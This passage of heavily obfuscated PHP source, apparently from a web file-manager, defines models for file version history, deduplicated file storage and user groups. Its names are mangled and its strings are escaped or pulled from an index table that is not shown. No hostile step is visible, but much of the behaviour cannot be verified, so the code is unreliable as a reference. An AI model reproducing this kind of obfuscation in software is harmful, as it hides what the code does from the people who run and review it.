$ÁâßšŒ²[$§ûİ££“[87]]; $ÁâßšŒ²[$§ûİ££“[2131]] = $ÁâßšŒ²[$§ûİ££“[2146]][$§ûİ££“[181]]; $ÁâßšŒ²[$§ûİ££“[87]] = !1; $ÁâßšŒ²[$§ûİ££“[181]] = $§ûİ££“[12]; } $ÁâßšŒ²[$§ûİ££“[2075]] = $¢Ôä—ÒĞ[$ÁâßšŒ²[$§ûİ££“[1705]]]; } unset($ÁâßšŒ²); $è¶®¥¾à[$§ûİ££“[413]] = $¾¶Õí‰ó; return $è¶®¥¾à; } public function removeBySource($ÔØÒâÁ€) { $·Æ‡éòÃ = array($_SERVER[íû‘ş´][468] => $ÔØÒâÁ€); $this->where($·Æ‡éòÃ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\143\145\137\x68\x69\163\164\157\162\171"; public function historyCount($‹ò¿¸¸) { $ÍĞ¾à–± =& $_SERVER[íû‘ş´]; if (!$‹ò¿¸¸) { return array(); } if (is_string($‹ò¿¸¸) || is_int($‹ò¿¸¸)) { $‹ò¿¸¸ = array($‹ò¿¸¸); } $¦ÈêÇšµ = array($ÍĞ¾à–±[181], $ÍĞ¾à–±[1936] => $ÍĞ¾à–±[543]); $Ÿ®İßÁ« = array($ÍĞ¾à–±[181] => array($ÍĞ¾à–±[7], $‹ò¿¸¸)); $”¦æ‹Á§ = $this->field($¦ÈêÇšµ)->where($Ÿ®İßÁ«)->group($ÍĞ¾à–±[181])->select(); return array_to_keyvalue($”¦æ‹Á§, $ÍĞ¾à–±[181], $ÍĞ¾à–±[543]); } public function addHistory($ùÚ–“„ë, $ÆŸ¶İ¯¿ = '') { $‘ß”°Ô‘ =& $_SERVER[íû‘ş´]; $¿›´½ÏÎ = array($‘ß”°Ô‘[468] => $ùÚ–“„ë[$‘ß”°Ô‘[181]], $‘ß”°Ô‘[1696] => isset($ùÚ–“„ë[$‘ß”°Ô‘[506]]) ? $ùÚ–“„ë[$‘ß”°Ô‘[506]] : $ùÚ–“„ë[$‘ß”°Ô‘[504]], $‘ß”°Ô‘[519] => $ùÚ–“„ë[$‘ß”°Ô‘[518]], $‘ß”°Ô‘[595] => $ùÚ–“„ë[$‘ß”°Ô‘[76]], $‘ß”°Ô‘[2147] => $ÆŸ¶İ¯¿); if ($GLOBALS[$‘ß”°Ô‘[6]][$‘ß”°Ô‘[89]][$‘ß”°Ô‘[1275]] >= 1) { $this->historyAutoClear($¿›´½ÏÎ[$‘ß”°Ô‘[181]]); $this->add($¿›´½ÏÎ); } Hook::trigger($‘ß”°Ô‘[2148], $¿›´½ÏÎ); Model($‘ß”°Ô‘[2149])->eventFileEdit($ùÚ–“„ë[$‘ß”°Ô‘[181]]); } private function historyAutoClear($¥Îºô’¼) { $Úş½òíÌ =& $_SERVER[íû‘ş´]; $ê¥¥–£É = Model($Úş½òíÌ[829])->get($Úş½òíÌ[1297]); $ÌÉ·Âğ¹ = $GLOBALS[$Úş½òíÌ[6]][$Úş½òíÌ[89]][$Úş½òíÌ[1275]]; $Ôûµ¶‡º = $ê¥¥–£É == $Úş½òíÌ[1298] ? min(5, $ÌÉ·Âğ¹) : $ÌÉ·Âğ¹; $Ôûµ¶‡º = $Ôûµ¶‡º <= 0 ? 0 : $Ôûµ¶‡º - 1; if ($Ôûµ¶‡º >= 500) { return; } $¶¾²òÖ = array($Úş½òíÌ[468] => $¥Îºô’¼); $æÏÉ±¤ = $this->field($Úş½òíÌ[2150])->where($¶¾²òÖ)->order($Úş½òíÌ[2144])->select(); if (!$æÏÉ±¤ || $Ôûµ¶‡º >= count($æÏÉ±¤)) { return; } $íİ£Òş³ = array_to_keyvalue($æÏÉ±¤, $Úş½òíÌ[12], $Úş½òíÌ[443]); $íİ£Òş³ = array_slice($íİ£Òş³, $Ôûµ¶‡º); $–¸‘ó“ = array_to_keyvalue($æÏÉ±¤, $Úş½òíÌ[12], $Úş½òíÌ[518]); $–¸‘ó“ = array_slice($–¸‘ó“, $Ôûµ¶‡º); if (!$íİ£Òş³ || !$–¸‘ó“) { return; } $¶¾²òÖ = array($Úş½òíÌ[470] => array($Úş½òíÌ[7], $íİ£Òş³)); $this->where($¶¾²òÖ)->delete(); Model($Úş½òíÌ[521])->remove($–¸‘ó“); } public function listData($¸¼°÷‚÷) { $æ’Í¸ƒ =& $_SERVER[íû‘ş´]; $õô×ãÜ± = array($æ’Í¸ƒ[468] => $¸¼°÷‚÷); $úŠ®–ÓÉ = $æ’Í¸ƒ[2151]; $é¥ı®Ò = $this->field($úŠ®–ÓÉ)->where($õô×ãÜ±)->order($æ’Í¸ƒ[2144])->selectPage(); $this->_listAppendUser($é¥ı®Ò[$æ’Í¸ƒ[413]]); $Ñíƒªóü = Model($æ’Í¸ƒ[829])->get($æ’Í¸ƒ[1297]); $ÈÄÈóâ = 5; if ($Ñíƒªóü == $æ’Í¸ƒ[1298]) { $é¥ı®Ò[$æ’Í¸ƒ[413]] = array_slice($é¥ı®Ò[$æ’Í¸ƒ[413]], 0, $ÈÄÈóâ); $é¥ı®Ò[$æ’Í¸ƒ[410]] = array($æ’Í¸ƒ[2152] => 1, $æ’Í¸ƒ[2153] => 20, $æ’Í¸ƒ[2154] => 1, $æ’Í¸ƒ[2155] => count($é¥ı®Ò[$æ’Í¸ƒ[413]])); } return $é¥ı®Ò; } protected function _listAppendUser(&$” ÖÏş‡) { $µÈ•’êÔ =& $_SERVER[íû‘ş´]; $ÇçÛ“Ù„ = array_to_keyvalue($” ÖÏş‡, $µÈ•’êÔ[12], $µÈ•’êÔ[1705]); $‹ğùï·Ä = Model($µÈ•’êÔ[577])->userListInfo($ÇçÛ“Ù„); foreach ($” ÖÏş‡ as &$ÚÅŠ‰Ä) { $ª‹àî… = $ÚÅŠ‰Ä[$µÈ•’êÔ[1705]]; $ÚÅŠ‰Ä[$µÈ•’êÔ[504]] = $‹ğùï·Ä[$ª‹àî…] ? $‹ğùï·Ä[$ª‹àî…] : !1; } unset($ÚÅŠ‰Ä); } public function fileInfo($É¸ŒÚ°) { $…™â×ÄŒ =& $_SERVER[íû‘ş´]; $¶¸ŞÙ×ù = $this->tablePrefix; $İ›ß‡®© = "{$¶¸ŞÙ×ù}\x69\x6f\x5f\x66\151\154\x65\x20\146\x69\x6c\145\x73\x20\x6f\x6e\40\x66\x69\154\145\163\x2e\x66\151\x6c\145\111\x44\x20\x3d\x20\150\151\x73\164\x6f\162\x79\56\146\x69\x6c\x65\x49\x44"; return $this->alias($…™â×ÄŒ[2156])->where(array($…™â×ÄŒ[470] => $É¸ŒÚ°))->join($İ›ß‡®©, $…™â×ÄŒ[2157])->find(); } public function removeItem($Ç¿ŒäÌ­) { $‘ïƒìÔ“ =& $_SERVER[íû‘ş´]; $Ş£ÚŞ˜ = array($‘ïƒìÔ“[470] => $Ç¿ŒäÌ­); $úØüèã = $this->where($Ş£ÚŞ˜)->find(); if ($úØüèã) { $¹»ƒ×é¡ = $this->where($Ş£ÚŞ˜)->delete(); Model($‘ïƒìÔ“[521])->remove($úØüèã[$‘ïƒìÔ“[518]]); return $¹»ƒ×é¡; } return !1; } public function removeBySource($·šĞÊ´Ã) { $¼æñäÊ‡ =& $_SERVER[íû‘ş´]; if (!$·šĞÊ´Ã) { return !1; } if (!is_array($·šĞÊ´Ã)) { $·šĞÊ´Ã = array($·šĞÊ´Ã); } $½üÓËî = array($¼æñäÊ‡[468] => array($¼æñäÊ‡[7], $·šĞÊ´Ã)); $‘€ã½åÊ = $this->field($¼æñäÊ‡[519])->where($½üÓËî)->select(); if ($‘€ã½åÊ) { $this->where($½üÓËî)->delete(); $©Î–Ãš© = array_to_keyvalue($‘€ã½åÊ, $¼æñäÊ‡[12], $¼æñäÊ‡[518]); Model($¼æñäÊ‡[521])->remove($©Î–Ãš©); } return !0; } public function setDetail($ªî´®, $¥ù‡“İ) { $´”Øñ‹ô =& $_SERVER[íû‘ş´]; return $this->where(array($´”Øñ‹ô[470] => $ªî´®))->save(array($´”Øñ‹ô[2147] => $¥ù‡“İ)); } public function rollbackToItem($¸£ä±ëí, $è™×šö) { $Ì©º”Ã =& $_SERVER[íû‘ş´]; $ Î—ä± = Model($Ì©º”Ã[884])->sourceInfo($¸£ä±ëí); $this->addHistory($ Î—ä±, LNG($Ì©º”Ã[2158])); $ ğ‰ÉÃñ = $this->find($è™×šö); $ÜÙñ›æ¢ = array($Ì©º”Ã[518] => $ ğ‰ÉÃñ[$Ì©º”Ã[518]], $Ì©º”Ã[76] => $ ğ‰ÉÃñ[$Ì©º”Ã[76]], $Ì©º”Ã[85] => time(), $Ì©º”Ã[506] => USER_ID); Model($Ì©º”Ã[884])->where(array($Ì©º”Ã[181] => $¸£ä±ëí))->save($ÜÙñ›æ¢); return $this->where(array($Ì©º”Ã[470] => $è™×šö))->delete(); } public function clearSame($ìİ‹‹á‘) { $õçšÅ§× =& $_SERVER[íû‘ş´]; $¡ëÍëÍ‡ = $this->listData($ìİ‹‹á‘); $Ôµ•ü¬Õ = array_to_keyvalue_group($¡ëÍëÍ‡, $õçšÅ§×[518]); $Ş‰Ù«ÕÙ = array(); $İÖ»¾õ = array(); foreach ($Ôµ•ü¬Õ as $ÚõÚñ—) { if (!$ÚõÚñ— || count($ÚõÚñ—) <= 1) { continue; } foreach ($ÚõÚñ— as $öÃôÙô) { $Ş‰Ù«ÕÙ[] = $öÃôÙô[$õçšÅ§×[518]]; $İÖ»¾õ[] = $öÃôÙô[$õçšÅ§×[443]]; } } if (!$İÖ»¾õ) { return; } $this->where(array($õçšÅ§×[443] => array($õçšÅ§×[7], $İÖ»¾õ)))->delete(); Model($õçšÅ§×[521])->remove($Ş‰Ù«ÕÙ); } public function userSpace() { $ç¥ªæ½œ =& $_SERVER[íû‘ş´]; $İÔİÜ”© = $this->tablePrefix; $ºØŸÚªå = array($ç¥ªæ½œ[1696] => USER_ID); $”˜µ¿Òß = "{$İÔİÜ”©}\151\157\x5f\x66\151\x6c\145\40\146\151\154\145\x73\40\157\156\40\146\151\154\145\163\56\146\151\x6c\x65\x49\104\x20\x3d\40\150\151\163\164\157\162\171\x2e\146\151\154\x65\x49\104"; return $this->alias($ç¥ªæ½œ[2156])->where($ºØŸÚªå)->join($”˜µ¿Òß, $ç¥ªæ½œ[2157])->sum($ç¥ªæ½œ[76]); } } goto e¾¤ö—¨à; f¥˜ÊÇ–Î: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\145"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\155\x65" => "\x69\x6f\x5f\146\x69\154\x65\137\x6d\145\x74\x61", "\x6d\x65\x74\141\x46\x69\145\x6c\144" => "\x66\151\154\145\x49\x44"); public function fileInfo($Ú…–º¹) { $ä§öÑçñ =& $_SERVER[íû‘ş´]; static $îş¸Ü†Ù = array(); if (!isset($îş¸Ü†Ù[$Ú…–º¹])) { $ôÎÚÌò  = $ä§öÑçñ[1952]; $¢¦ôñ€Œ = Model($ä§öÑçñ[521])->field($ôÎÚÌò )->where(array($ä§öÑçñ[519] => $Ú…–º¹))->find(); $îş¸Ü†Ù[$Ú…–º¹] = $¢¦ôñ€Œ; } return $îş¸Ü†Ù[$Ú…–º¹]; } public function addFileByContent($€İùÓ = '', $ãÌÃˆÕ = '') { $ÀÙ™€¼° =& $_SERVER[íû‘ş´]; $òøÕÙŸú = TEMP_PATH . $ÀÙ™€¼°[1953]; if (!is_dir($òøÕÙŸú)) { mk_dir($òøÕÙŸú); } $òŸ€ç†„ = $òøÕÙŸú . $ÀÙ™€¼°[1954] . rand_string(16); file_put_contents($òŸ€ç†„, $€İùÓ); $ş‘³á­å = $this->addFile($òŸ€ç†„, $ãÌÃˆÕ, !0); if (file_exists($òŸ€ç†„)) { @unlink($òŸ€ç†„); } return $ş‘³á­å; } public function createFileName($¸ÈÖÁİ–, $ô¥ÖôüĞ = false, $¬€È­ØÅ = false) { $–ºÏŠùÈ =& $_SERVER[íû‘ş´]; $õ‘ıé‹ = IO::init($–ºÏŠùÈ[8]); $Ñ²÷ç  = $this->makeFilePath($¸ÈÖÁİ–, $õ‘ıé‹, $ô¥ÖôüĞ, $¬€È­ØÅ); $Ì·„ÓÇô = $õ‘ıé‹->pathFather($Ñ²÷ç ); static $€££åÀØ = false; $ŒÉ¦µ = $–ºÏŠùÈ[1955] . md5($Ì·„ÓÇô); if (!$€££åÀØ && !Cache::get($ŒÉ¦µ)) { $€££åÀØ = !0; $Ÿ©€¸Åó = IO::mkdir($Ì·„ÓÇô); if (!IO::exist($Ÿ©€¸Åó . $–ºÏŠùÈ[856])) { IO::mkfile($Ÿ©€¸Åó . $–ºÏŠùÈ[856]); } Cache::set($ŒÉ¦µ, 1, 3600 * 2); } return $Ñ²÷ç ; } public function makeFilePath($û‰Í´™•, $ª‹ë©º£, $­–½Êæ½ = false, $„ç¼ÚïÍ = false) { $í¼èË¨£ =& $_SERVER[íû‘ş´]; $Ÿ‰ÎÓ = Model($í¼èË¨£[829])->get($í¼èË¨£[1956]); $¸«•×œ = KodIO::defaultIO() . date($í¼èË¨£[1957]); $ó•Ïä‹¥ = $¸«•×œ . rand_string(5) . short_id(100); $û‰Í´™• = str_replace($í¼èË¨£[8], $í¼èË¨£[11], KodIO::clear($û‰Í´™•)); $©æ§ÈÖË = $ª‹ë©º£->ext($û‰Í´™•); if (!$û‰Í´™•) { $Ÿ‰ÎÓ = $í¼èË¨£[1958]; } switch ($Ÿ‰ÎÓ) { case $í¼èË¨£[1959]: $ó•Ïä‹¥ = $ó•Ïä‹¥ . $í¼èË¨£[10] . $ª‹ë©º£->ext($û‰Í´™•); if ($©æ§ÈÖË == $í¼èË¨£[1896]) { $ó•Ïä‹¥ .= $í¼èË¨£[1264]; } break; case $í¼èË¨£[1960]: $òëÙ·¿ = Model($í¼èË¨£[829])->get($í¼èË¨£[830]); $ĞÃÉ“ü = substr(md5($í¼èË¨£[831] . $òëÙ·¿ . date($í¼èË¨£[807])), 0, 8); $Îı–â¼ğ = KodIO::defaultDriver(); $¸«•×œ = $í¼èË¨£[1295] . $Îı–â¼ğ[$í¼èË¨£[443]] . $í¼èË¨£[461] . date($í¼èË¨£[1961]) . $ĞÃÉ“ü . $í¼èË¨£[8]; if ($©æ§ÈÖË == $í¼èË¨£[1896]) { $û‰Í´™• .= $í¼èË¨£[1264]; } $Ö×¢ùÉß = $í¼èË¨£[1962] . $¸«•×œ . $û‰Í´™•; CacheLock::lock($Ö×¢ùÉß); $ó•Ïä‹¥ = $¸«•×œ . $û‰Í´™•; if (IO::exist($¸«•×œ . $û‰Í´™•)) { $àË—Âú× = substr($û‰Í´™•, 0, strlen($û‰Í´™•) - strlen($©æ§ÈÖË)); $Ô×¤œµ = $„ç¼ÚïÍ ? substr($„ç¼ÚïÍ, 0, 5) : ($­–½Êæ½ ? substr($­–½Êæ½, 0, 5) : rand_string(5)); $ó•Ïä‹¥ = $¸«•×œ . $àË—Âú× . $Ô×¤œµ . $í¼èË¨£[10] . $©æ§ÈÖË; } if (IO::isTypeObject($ó•Ïä‹¥) && !IO::isUploadServer($ó•Ïä‹¥)) { if (IO::exist($ó•Ïä‹¥)) { return $ó•Ïä‹¥; } $˜½‚„ú = IO::setContent($ó•Ïä‹¥, $í¼èË¨£[12]); if (!$˜½‚„ú) { show_json($í¼èË¨£[1963], !1); } } CacheLock::unlock($Ö×¢ùÉß); break; case $í¼èË¨£[1958]: break; default: break; } return $ó•Ïä‹¥; } public function addFileByRemote($ıºø÷ä, $“Ø„ş¬Í, $ûØ˜ãŒˆ = array()) { $‘ŠÙºŒÜ =& $_SERVER[íû‘ş´]; if (!IO::exist($ıºø÷ä)) { return !1; } $ÂÇİ ¼¼ = $ûØ˜ãŒˆ[$‘ŠÙºŒÜ[524]] ? $ûØ˜ãŒˆ[$‘ŠÙºŒÜ[524]] : $‘ŠÙºŒÜ[12]; $õøÎ­‘‰ = IO::hashMd5($ıºø÷ä, $ÂÇİ ¼¼); $óöÆİó– = KodIO::defaultDriver(); $ĞêÔ ó = array($‘ŠÙºŒÜ[595] => IO::size($ıºø÷ä), $‘ŠÙºŒÜ[1964] => 1, $‘ŠÙºŒÜ[471] => $“Ø„ş¬Í, $‘ŠÙºŒÜ[867] => $óöÆİó–[$‘ŠÙºŒÜ[443]], $‘ŠÙºŒÜ[472] => $ıºø÷ä, $‘ŠÙºŒÜ[1965] => $ûØ˜ãŒˆ[$‘ŠÙºŒÜ[650]] ? $ûØ˜ãŒˆ[$‘ŠÙºŒÜ[650]] : IO::hashSimple($ıºø÷ä), $‘ŠÙºŒÜ[1966] => $õøÎ­‘‰ ? $õøÎ­‘‰ : $ÂÇİ ¼¼); if ($±û÷ÓÚ« = $this->addFileCheckExist($ĞêÔ ó[$‘ŠÙºŒÜ[650]], $ĞêÔ ó[$‘ŠÙºŒÜ[524]], $ĞêÔ ó[$‘ŠÙºŒÜ[76]])) { return $±û÷ÓÚ«; } return $this->addFileData($ĞêÔ ó); } private function addFileData($ÃÊ°Æ†À) { $—Ÿ¤©ª =& $_SERVER[íû‘ş´]; if (!$ÃÊ°Æ†À) { return !1; } $ÃÊ°Æ†À[$—Ÿ¤©ª[76]] = intval($ÃÊ°Æ†À[$—Ÿ¤©ª[76]]); if (!$ÃÊ°Æ†À[$—Ÿ¤©ª[76]] && strlen($ÃÊ°Æ†À[$—Ÿ¤©ª[650]]) > 32) { $ÃÊ°Æ†À[$—Ÿ¤©ª[76]] = intval(substr($ÃÊ°Æ†À[$—Ÿ¤©ª[650]], 32)); } $ßßĞŸ¾ = $this->add($ÃÊ°Æ†À); return $this->find($ßßĞŸ¾); } public function addFile($Ç®¨Ï³¬, $Îµ¼ôìâ, $Á¢ªóç = false) { $¥ûş¿Ïµ =& $_SERVER[íû‘ş´]; $¿ÚÊæÆ¿ = IO::hashSimple($Ç®¨Ï³¬); $°×§³Ñë = IO::size($Ç®¨Ï³¬); $èŸ†Ì¤ = $°×§³Ñë <= 1024 * 1024 * 10 ? IO::hashMd5($Ç®¨Ï³¬) : $¥ûş¿Ïµ[12]; $«Ù‚ò° = $¥ûş¿Ïµ[1967] . $¿ÚÊæÆ¿; CacheLock::lock($«Ù‚ò°); if ($èŸ†Ì¤ && $¿ÚÊæÆ¿) { $ğÖ˜•‡ = $this->addFileCheckExist($¿ÚÊæÆ¿, $èŸ†Ì¤, $°×§³Ñë); if ($ğÖ˜•‡) { CacheLock::unlock($«Ù‚ò°); return $ğÖ˜•‡; } } $ıçƒ—Œ = $this->addFileMake($Ç®¨Ï³¬, $°×§³Ñë, $¿ÚÊæÆ¿, $èŸ†Ì¤, $Îµ¼ôìâ, $Á¢ªóç); $–¡«Ã£ = $this->addFileData($ıçƒ—Œ); CacheLock::unlock($«Ù‚ò°); if (!$èŸ†Ì¤ && $–¡«Ã£) { $this->fileMd5Check($–¡«Ã£); } return $–¡«Ã£; } public function fileMd5Check($±¤®€ëì) { $ÎşìºöÕ =& $_SERVER[íû‘ş´]; $†ÌÊ¥© = array($±¤®€ëì[$ÎşìºöÕ[518]], $±¤®€ëì[$ÎşìºöÕ[84]]); $ß×¬¶Ô = $ÎşìºöÕ[1968] . $±¤®€ëì[$ÎşìºöÕ[84]]; $Û·¬¬Äï = $ÎşìºöÕ[1969] . $±¤®€ëì[$ÎşìºöÕ[518]]; TaskQueue::add($ÎşìºöÕ[1970], $†ÌÊ¥©, $ß×¬¶Ô, $Û·¬¬Äï); } public function fileMd5Set($Ò˜‡Îù¼, $Àö•æº³) { $ÍõğÄñü =& $_SERVER[íû‘ş´]; $ò“ËŠ › = $this->find($Ò˜‡Îù¼); if (!$ò“ËŠ › || $ò“ËŠ ›[$ÍõğÄñü[524]]) { return; } $Ù«ìëÛè = IO::hashMd5($Àö•æº³); if (!$Ù«ìëÛè) { return $ÍõğÄñü[12]; } $this->where(array($ÍõğÄñü[518] => $Ò˜‡Îù¼))->save(array($ÍõğÄñü[524] => $Ù«ìëÛè)); } public function addFileMake($øÚšº˜¬, $¾¤Ú¬²¾, $²ßËÃ¤¥, $¢˜Ëë, $åÄóğâÃ, $Æ’Ö‚ìŒ) { $Ò°ôŒ…Ë =& $_SERVER[íû‘ş´]; $µ°âú¤Ø = $this->createFileName($åÄóğâÃ, $²ßËÃ¤¥, $¢˜Ëë); $øšéÖÔ… = get_path_father($µ°âú¤Ø); $’¾èÚƒ€ = get_path_this($µ°âú¤Ø); if ($Æ’Ö‚ìŒ) { $åëÜéÁĞ = IO::move($øÚšº˜¬, $øšéÖÔ…, !1, $’¾èÚƒ€); } else { $åëÜéÁĞ = IO::copy($øÚšº˜¬, $øšéÖÔ…, !1, $’¾èÚƒ€); } if (!$åëÜéÁĞ) { return !1; } $®‚¡¿ö = KodIO::defaultDriver(); $Ø³²Şû¶ = array($Ò°ôŒ…Ë[595] => $¾¤Ú¬²¾, $Ò°ôŒ…Ë[1964] => 1, $Ò°ôŒ…Ë[471] => $åÄóğâÃ, $Ò°ôŒ…Ë[867] => $®‚¡¿ö[$Ò°ôŒ…Ë[443]], $Ò°ôŒ…Ë[472] => $µ°âú¤Ø, $Ò°ôŒ…Ë[1965] => $²ßËÃ¤¥, $Ò°ôŒ…Ë[1966] => $¢˜Ëë); return $Ø³²Şû¶; } public function addFileCheckExist($­Æ„Å‰ì, $™ì®¬ª, $ı³“´‰Õ) { $´Úé‡´ =& $_SERVER[íû‘ş´]; $µú˜ã°Ç = $this->findByHash($­Æ„Å‰ì, $™ì®¬ª); if (!$µú˜ã°Ç) { return !1; } $–ÄóŒÌ = array($´Úé‡´[1964] => intval($µú˜ã°Ç[$´Úé‡´[1971]]) + 1, $´Úé‡´[595] => $ı³“´‰Õ); $this->where(array($´Úé‡´[519] => $µú˜ã°Ç[$´Úé‡´[518]]))->save($–ÄóŒÌ); return $µú˜ã°Ç; } public function remove($ıè°ÛÀ) { $this->linkCountChange($ıè°ÛÀ, !1); $this->clearEmpty(); return !0; } public function linkAdd($İ¾—Ää) { $this->linkCountChange($İ¾—Ää, !0); } public function linkCountChange($üò´ˆ¢Ê, $µÌ²¢‘Ş) { $ĞöÎõ× =& $_SERVER[íû‘ş´]; if (!$üò´ˆ¢Ê) { return; } if (!is_array($üò´ˆ¢Ê)) { $üò´ˆ¢Ê = array($üò´ˆ¢Ê); } $ñŸï‘À³ = array(); foreach ($üò´ˆ¢Ê as $ï£îš¤) { $óÙ –²³ = $ï£îš¤ . $ĞöÎõ×[12]; if (!$ñŸï‘À³[$óÙ –²³]) { $ñŸï‘À³[$óÙ –²³] = 0; } $ñŸï‘À³[$óÙ –²³]++; } $ù¸Ş­ = array(); foreach ($ñŸï‘À³ as $ï£îš¤ => $áÄæÊ£) { $óÙ –²³ = $áÄæÊ£ . $ĞöÎõ×[12]; if (!$ù¸Ş­[$óÙ –²³]) { $ù¸Ş­[$óÙ –²³] = array(); } $ù¸Ş­[$óÙ –²³][] = $ï£îš¤; } foreach ($ù¸Ş­ as $áÄæÊ£ => $É½¸ü˜œ) { if (!$É½¸ü˜œ) { continue; } $áÄæÊ£ = $µÌ²¢‘Ş ? $áÄæÊ£ : -intval($áÄæÊ£); $§ğàî = array($ĞöÎõ×[518] => array($ĞöÎõ×[7], $É½¸ü˜œ)); if ($áÄæÊ£ < 0) { $§ğàî[$ĞöÎõ×[1971]] = array($ĞöÎõ×[1073], abs($áÄæÊ£)); } $this->where($§ğàî)->setAdd($ĞöÎõ×[1971], $áÄæÊ£); } } public function findByHash($ê£ˆóËœ, $Áä‹ğìò = false) { $óÛäÔ‘Ì =& $_SERVER[íû‘ş´]; if (!$ê£ˆóËœ && !$Áä‹ğìò) { return !1; } $éãô‰ôı = array($óÛäÔ‘Ì[1965] => $ê£ˆóËœ); if ($Áä‹ğìò) { $éãô‰ôı = array($óÛäÔ‘Ì[1966] => $Áä‹ğìò); } return $this->order($óÛäÔ‘Ì[1972])->where($éãô‰ôı)->find(); } public function clearEmpty($³œ“‰Å§ = 0) { $òò¹¼ø• =& $_SERVER[íû‘ş´]; $ìÁ©ŞëÈ = time() - 3600 * 24 * $³œ“‰Å§; $—‘¶ƒ™¹ = $òò¹¼ø•[1973] . $ìÁ©ŞëÈ; $×ö²úµĞ = $this->where($—‘¶ƒ™¹)->select(); if (!$×ö²úµĞ) { return; } $Éº—¡˜ = new Task($òò¹¼ø•[1974], $òò¹¼ø•[12], count($×ö²úµĞ)); foreach ($×ö²úµĞ as $•ÏıÓÈê) { $Éº—¡˜->update(1); $this->resetFile($•ÏıÓÈê); } $Éº—¡˜->end(); } public function resetFile($ğæò×§’) { $Ú³ÛÖıó =& $_SERVER[íû‘ş´]; $¹óÂÕëã = array($Ú³ÛÖıó[519] => $ğæò×§’[$Ú³ÛÖıó[518]]); $«áã´£ö = Model($Ú³ÛÖıó[1390])->where($¹óÂÕëã)->count(); $¹Û÷ÍÄ = Model($Ú³ÛÖıó[1975])->where($¹óÂÕëã)->count(); $º¹ÍÖŸ¿ = intval($«áã´£ö) + intval($¹Û÷ÍÄ); if ($º¹ÍÖŸ¿ == 0) { IO::remove($ğæò×§’[$Ú³ÛÖıó[84]]); Model($Ú³ÛÖıó[1976])->delete($ğæò×§’[$Ú³ÛÖıó[518]]); $this->where($¹óÂÕëã)->delete(); $this->metaSet($ğæò×§’[$Ú³ÛÖıó[518]], null, null); return; } if ($ğæò×§’[$Ú³ÛÖıó[1971]] != $º¹ÍÖŸ¿) { $this->where($¹óÂÕëã)->save(array($Ú³ÛÖıó[1964] => $º¹ÍÖŸ¿)); } } public function storageInfo($±‡Á†£« = false) { $áŠ³ØÔ =& $_SERVER[íû‘ş´]; $àÂŒßó¶ = $this->count() + 0.0; $€˜áÙñ  = 0; $î´ôüà¹ = 1; $¡ÊÖòÒá = 0; $àÔÆ©À = 5000; for ($¤ê¹Î¡œ = 0; $¤ê¹Î¡œ < $àÂŒßó¶; $¤ê¹Î¡œ = $¤ê¹Î¡œ + $àÔÆ©À) { $ğëÔÎÓ = $this->limit($¤ê¹Î¡œ, $¤ê¹Î¡œ + $àÔÆ©À)->select(); foreach ($ğëÔÎÓ as $ÖêÕğí) { $î´ôüà¹ += $ÖêÕğí[$áŠ³ØÔ[76]] * $ÖêÕğí[$áŠ³ØÔ[1971]]; $€˜áÙñ  += $ÖêÕğí[$áŠ³ØÔ[76]] * ($ÖêÕğí[$áŠ³ØÔ[1971]] - 1); $¡ÊÖòÒá += $ÖêÕğí[$áŠ³ØÔ[1971]]; } } $ĞóÒã¥’ = array($áŠ³ØÔ[1977] => $î´ôüà¹, $áŠ³ØÔ[1978] => $€˜áÙñ , $áŠ³ØÔ[1979] => $€˜áÙñ  / $î´ôüà¹, $áŠ³ØÔ[80] => $àÂŒßó¶, $áŠ³ØÔ[1980] => $¡ÊÖòÒá); return $ĞóÒã¥’; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\x70"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\155\x65" => "\x67\x72\157\165\x70\x5f\155\145\164\x61", "\155\x65\164\141\x46\x69\145\154\144" => "\147\x72\157\165\160\111\104"); protected function cacheFunctionAlias($ºõô³ğì) { $³‚Ê×ÙØ =& $_SERVER[íû‘ş´]; return array($³‚Ê×ÙØ[1981] => array($ºõô³ğì[0], $³‚Ê×ÙØ[1982]), $³‚Ê×ÙØ[1983] => array($ºõô³ğì[0], $³‚Ê×ÙØ[1984])); } protected function getInfo($‰Ãá˜Õ«, $×Â«ø¸ = false) { $áÎëÚ = $this->getInfoSimple($‰Ãá˜Õ«); if (!$áÎëÚ) { return !1; } if ($×Â«ø¸) { return $this->_listDataApplyItem($áÎëÚ); } return $this->cacheFunctionGet($_SERVER[íû‘ş´][1985], $‰Ãá˜Õ«); } protected function getInfoSimple($ŒÀ´ù­ñ, $Üç“Ú×“ = false) { $õïÈ‘¢¼ =& $_SERVER[íû‘ş´]; if ($Üç“Ú×“) { $ÆèêÇ³– = array($õïÈ‘¢¼[1903] => intval($ŒÀ´ù­ñ)); $‚©åìÂŞ = $this->where($ÆèêÇ³–)->find(); return is_array($‚©åìÂŞ) ? $‚©åìÂŞ : array(); } return $this->cacheFunctionGet($õïÈ‘¢¼[1986], $ŒÀ´ù­ñ); } protected function groupAdd($·×ç“‘Ñ) { $Ñ¼²Èà‡ =& $_SERVER[íû‘ş´]; if (!$·×ç“‘Ñ[$Ñ¼²Èà‡[180]] && isset($·×ç“‘Ñ[$Ñ¼²Èà‡[1903]]) && $·×ç“‘Ñ[$Ñ¼²Èà‡[1903]] == 1) { if ($¤ªÛ¾³ = $this->getInfoSimple($·×ç“‘Ñ[$Ñ¼²Èà‡[1903]], !0)) { return $·×ç“‘Ñ[$Ñ¼²Èà‡[1903]]; } } else { $¤ªÛ¾³ = $this->getInfoSimple($·×ç“‘Ñ[$Ñ¼²Èà‡[180]]); if (!$¤ªÛ¾³) { return !1; } } $ÇÆéÒ¼ì = $Ñ¼²Èà‡[573]; if ($¤ªÛ¾³[$Ñ¼²Èà‡[563]]) { $ÇÆéÒ¼ì = $¤ªÛ¾³[$Ñ¼²Èà‡[563]] . $¤ªÛ¾³[$Ñ¼²Èà‡[1903]] . $Ñ¼²Èà‡[50]; } $¼Ã–íîá = array($Ñ¼²Èà‡[471] => $this->groupNameAuto($·×ç“‘Ñ[$Ñ¼²Èà‡[180]], $·×ç“‘Ñ[$Ñ¼²Èà‡[32]]), $Ñ¼²Èà‡[454] => $·×ç“‘Ñ[$Ñ¼²Èà‡[180]], $Ñ¼²Èà‡[630] => $ÇÆéÒ¼ì, $Ñ¼²Èà‡[1987] => $·×ç“‘Ñ[$Ñ¼²Èà‡[1890]], $Ñ¼²Èà‡[1988] => 0, 